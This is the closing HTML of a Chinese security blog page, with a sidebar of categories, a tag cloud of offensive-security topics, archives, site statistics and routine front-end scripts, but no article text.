2023-02-14 23:58:53">2023-02-14</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            <a class="card-more-btn" href="/categories/" title="查看更多">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/C-%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">C++笔记</span><span class="card-category-list-count">8</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CodeQL/"><span class="card-category-list-name">CodeQL</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Docker%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Docker笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/GDB%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">GDB笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Golang%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Golang笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Linux%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Linux笔记</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Windows%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Windows笔记</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/XSS/"><span class="card-category-list-name">XSS</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/BadUSB/" style="font-size: 1.15em; color: rgb(133, 89, 182)">BadUSB</a><a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 1.2em; color: rgb(100, 58, 144)">钓鱼</a><a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 1.35em; color: rgb(45, 49, 198)">免杀</a><a href="/tags/%E6%9C%A8%E9%A9%AC/" style="font-size: 1.3em; color: rgb(130, 50, 141)">木马</a><a href="/tags/%E7%97%85%E6%AF%92/" style="font-size: 1.2em; color: rgb(48, 127, 136)">病毒</a><a href="/tags/%E7%BB%95%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 1.15em; color: rgb(32, 189, 118)">绕虚拟机</a><a href="/tags/CobaltStrike/" style="font-size: 1.2em; color: rgb(75, 97, 58)">CobaltStrike</a><a href="/tags/C/" style="font-size: 1.4em; color: rgb(109, 23, 148)">C++</a><a href="/tags/Metasploit/" style="font-size: 1.15em; color: rgb(68, 61, 188)">Metasploit</a><a href="/tags/%E6%AD%A3%E5%88%99/" style="font-size: 1.15em; color: rgb(137, 171, 134)">正则</a><a href="/tags/C-%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/" style="font-size: 1.15em; color: rgb(28, 27, 151)">C++命名规范</a><a href="/tags/CSGO/" style="font-size: 1.45em; color: rgb(92, 146, 162)">CSGO</a><a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size: 1.45em; color: rgb(57, 43, 47)">破解</a><a href="/tags/%E5%A4%96%E6%8C%82/" style="font-size: 1.45em; color: rgb(159, 176, 41)">外挂</a><a href="/tags/CodeQL/" style="font-size: 1.15em; color: rgb(68, 2, 97)">CodeQL</a><a href="/tags/XSS/" style="font-size: 1.2em; color: rgb(167, 118, 26)">XSS</a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.15em; color: rgb(104, 12, 50)">数据库</a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.15em; color: rgb(78, 93, 192)">SQL注入</a><a href="/tags/Docker/" style="font-size: 1.15em; color: rgb(182, 108, 60)">Docker</a><a href="/tags/DLL%E5%8A%AB%E6%8C%81/" style="font-size: 1.15em; color: rgb(23, 76, 117)">DLL劫持</a><a href="/tags/ELF/" style="font-size: 1.15em; color: rgb(62, 31, 175)">ELF</a><a href="/tags/%E5%8E%BB%E9%99%A4%E7%89%B9%E5%BE%81/" style="font-size: 1.15em; color: rgb(28, 197, 160)">去除特征</a><a href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA/" style="font-size: 1.15em; color: rgb(18, 123, 125)">无人机</a><a href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA%E9%85%8D%E4%BB%B6/" style="font-size: 1.15em; color: rgb(97, 41, 83)">无人机配件</a><a href="/tags/%E9%AB%98%E6%95%B0/" style="font-size: 1.4em; color: rgb(161, 156, 23)">高数</a><a href="/tags/GDB/" style="font-size: 1.15em; color: rgb(196, 15, 129)">GDB</a><a href="/tags/Golang/" style="font-size: 1.15em; color: rgb(53, 147, 34)">Golang</a><a href="/tags/%E7%A1%AC%E4%BB%B6/" style="font-size: 1.15em; color: rgb(199, 6, 88)">硬件</a><a href="/tags/%E5%A0%86/" style="font-size: 1.25em; color: rgb(108, 147, 130)">堆</a><a href="/tags/%E6%A0%88/" style="font-size: 1.35em; color: rgb(98, 125, 17)">栈</a><a href="/tags/%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/" style="font-size: 1.15em; color: rgb(132, 6, 79)">内存结构</a><a href="/tags/%E6%BA%A2%E5%87%BA/" style="font-size: 1.35em; color: rgb(7, 5, 175)">溢出</a><a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 1.15em; color: rgb(181, 122, 57)">抓包</a><a href="/tags/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/" style="font-size: 1.15em; color: rgb(74, 13, 136)">双向认证</a><a href="/tags/%E5%8D%95%E5%90%91%E8%AE%A4%E8%AF%81/" style="font-size: 1.15em; color: rgb(115, 118, 136)">单向认证</a><a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 1.25em; color: rgb(145, 149, 103)">信息收集</a><a href="/tags/java%E7%8E%AF%E5%A2%83/" style="font-size: 1.15em; color: rgb(145, 28, 45)">java环境</a><a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 1.4em; color: rgb(27, 61, 156)">红蓝对抗</a><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 1.15em; color: rgb(136, 129, 92)">应急响应</a><a href="/tags/Meterpreter/" style="font-size: 1.15em; color: rgb(22, 31, 97)">Meterpreter</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/02/"><span class="card-archive-list-date">2023年02月</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">2022年12月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/10/"><span class="card-archive-list-date">2022年10月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/09/"><span class="card-archive-list-date">2022年09月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">2022年07月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/05/"><span class="card-archive-list-date">2022年05月</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/04/"><span class="card-archive-list-date">2022年04月</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/03/"><span class="card-archive-list-date">2022年03月</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">73</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2017-08-08T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">202.4k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-03-03T12:03:02.143Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://raw.githubusercontent.com/Ascotbe/Image/master/Blog/1.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By ascotbe</div><div class="footer_custom_text">Hi, welcome to my <a href="https://www.ascotbe.com/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["我们都是阴沟里的虫子&#44;但总还是得有人仰望星空","We are all in the gutter&#44;but there is still looking at the stars."],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = '我们都是阴沟里的虫子&#44;但总还是得有人仰望星空'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><script src="/js/snowflake.js"></script><div class="aplayer no-destroy" data-id="2276118625" data-server="netease" data-type="playlist" data-fixed="true"  data-mini="playlist" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["link[rel=\"canonical\"]","meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"model":{"jsonPath":"/live2dw/assets/ots14_3001.model.json"},"display":{"position":"right","width":350,"height":400,"hOffset":-50,"vOffset":0},"mobile":{"show":false},"log":false});</script></body></html>